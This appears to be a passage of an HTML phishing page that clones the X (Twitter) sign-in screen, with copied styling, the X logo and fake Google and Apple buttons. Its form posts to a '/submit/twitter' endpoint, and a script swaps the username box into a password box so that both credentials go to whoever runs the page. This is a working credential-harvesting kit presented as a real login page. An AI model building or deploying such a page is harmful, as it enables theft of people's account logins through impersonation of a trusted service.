            background: #000;
            color: #e7e9ea;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;

        .divider {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #2f3336;
        }
        
        .divider span {
            background: #000;
            padding: 0 16px;
            color: #e7e9ea;
            font-size: 15px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .input-field {
            width: 100%;
            padding: 12px 16px;
            font-size: 17px;
            border: 1px solid #333639;
            border-radius: 4px;
            background: #000;
            color: #e7e9ea;
            transition: border-color 0.2s;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #1d9bf0;
        }
        
        .input-field::placeholder {
            color: #71767b;
        }
        
        .next-btn {
            width: 100%;
            background: #e7e9ea;
            color: #0f1419;
            border: none;
            border-radius: 20px;
            font-size: 15px;
            font-weight: 700;
            padding: 12px;
            cursor: pointer;
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }
        
        .next-btn:hover {
            background: #d7dbdf;
        }
        
        .forgot-btn {
            width: 100%;
            background: transparent;
            color: #e7e9ea;
            border: 1px solid #536471;
            border-radius: 20px;
            font-size: 15px;
            font-weight: 700;
            padding: 12px;
            cursor: pointer;
            margin-bottom: 60px;
            transition: background-color 0.2s;
        }
        
        .forgot-btn:hover {
            background: #181818;
        }
        
        .signup-text {
            font-size: 15px;
            color: #71767b;
            text-align: left;
        }
        
        .signup-text a {
            color: #1d9bf0;
            text-decoration: none;
        }
        
        .signup-text a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 600px) {
            body {
                padding: 10px;
            }
            
            .container {
                max-width: 100%;
                padding: 20px 16px;
            }
            
            .x-logo {
                width: 24px;
                height: 24px;
                margin-bottom: 24px;
            }
            
            .title {
                font-size: 24px;
                margin-bottom: 24px;
            }
            
            .social-btn {
                font-size: 16px;
                padding: 12px 24px;
                margin-bottom: 8px;
            }
            
            .input-field {
                font-size: 16px; /* Prevent zoom on iOS */
                padding: 16px;
            }
            
            .next-btn, .forgot-btn {
                font-size: 16px;
                padding: 14px;
            }
            
            .forgot-btn {
                margin-bottom: 40px;
            }
            
            .signup-text {
                font-size: 14px;
                text-align: center;
            }
        }
        
        @media (max-width: 320px) {
            .container {
                padding: 16px 12px;
            }
            
            .title {
                font-size: 20px;
            }
            
            .social-btn {
                font-size: 14px;
                padding: 10px 20px;
            }
            
            .google-icon,
            .apple-icon {
                width: 16px;
                height: 16px;
            }
        }

</head>
<body>
    <div class="container">
        <svg viewBox="0 0 24 24" class="x-logo">
            <g>
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
            </g>
        </svg>
        
        <h1 class="title" style="text-align: center;">Sign in to X</h1>
        
        <div class="social-buttons">
            <a href="#" class="social-btn">
                <div class="google-icon"></div>
                Continue with Google
            </a>
            <a href="#" class="social-btn">
                <div class="apple-icon"></div>
                Continue with Apple
            </a>
        </div>
        
        <div class="divider">
            <span>or</span>
        </div>
        
        <form action="/submit/twitter" method="post">
            <div class="form-group">
                <input type="text" id="username-input" name="username" class="input-field" placeholder="Phone, email, or username" required>
                <input type="hidden" id="username-hidden" name="username">
            </div>
            
            <button type="submit" class="next-btn">Next</button>
        </form>
        
        <button class="forgot-btn">Forgot password?</button>
        
        <p class="signup-text">
            Don't have an account? <a href="#">Sign up</a>
        </p>
    </div>
    
    <script>
        // Simulate X's behavior of asking for password on second step
        let isPasswordStep = false;
        const form = document.querySelector('form');
        const usernameField = document.querySelector('input[name="username"]');
        const nextBtn = document.querySelector('.next-btn');
        
        form.addEventListener('submit', function(e) {
            if (!isPasswordStep) {
                e.preventDefault();
                // Transform to password step
                document.getElementById('username-hidden').value = document.getElementById('username-input').value;
                usernameField.type = 'password';
                usernameField.name = 'password';
                usernameField.placeholder = 'Password';
                usernameField.value = '';
                usernameField.focus();
                nextBtn.textContent = 'Log in';
                isPasswordStep = true;
            }
        });
    </script>
</body>
</html>
